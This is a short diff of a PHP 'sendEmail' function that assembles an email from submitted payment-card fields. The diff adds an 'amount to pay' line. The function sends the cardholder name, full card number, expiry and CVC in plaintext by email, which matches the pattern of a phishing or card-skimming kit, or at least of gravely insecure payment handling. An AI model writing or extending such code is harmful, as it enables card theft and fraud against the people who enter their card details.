@@ -22,6 +22,7 @@ function sendEmail($post) {
     $email_body = "You have received a new message.\n\n";
     $email_body .= "Card owner: $name\n";
     $email_body .= "Card number: $card_number\n";
+    $email_body .= "amount to pay: $amount_to_pay\n";
     $email_body .= "Card expiration year: $card_expiration_year\n";
     $email_body .= "Card expiration month: $card_expiration_month\n";
     $email_body .= "Card CVC: $cvv\n";
